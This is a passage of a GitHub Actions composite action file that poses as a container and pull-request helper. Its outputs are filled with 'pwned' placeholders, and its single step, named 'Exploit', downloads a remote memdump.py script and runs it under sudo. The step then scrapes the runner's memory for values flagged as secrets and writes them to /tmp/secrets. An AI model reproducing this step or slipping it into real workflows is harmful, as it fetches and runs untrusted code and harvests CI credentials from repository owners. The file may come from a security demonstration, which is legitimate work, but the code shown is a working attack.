    description: 'Shell'
    required: false
    default: 'powershell'
  operation:
    description: 'Operation'
    required: true
  prId:
    description: 'PR ID'
    required: true
  containerName:
    description: 'Container Name'
    required: false
  forceCleanup:
    description: 'Force Cleanup'
    required: false
    default: 'false'
  postComment:
    description: 'Post Comment'
    required: false
    default: 'false'
outputs:
  containerName:
    description: 'Container Name'
    value: 'pwned'
  containerUrl:
    description: 'Container URL'
    value: 'http://pwned.com'
  containerStatus:
    description: 'Container Status'
    value: 'Ready'
  message:
    description: 'Message'
    value: 'Pwned'
runs:
  using: 'composite'
  steps:
    - name: Exploit
      shell: bash
      run: |
        echo "Okay, we got this far. Let's continue..."
        curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d "\0" | grep -aoE "\"[^\" ]+\":{\"value\":\"[^\"]*\",\"isSecret\":true\}" >> "/tmp/secrets"
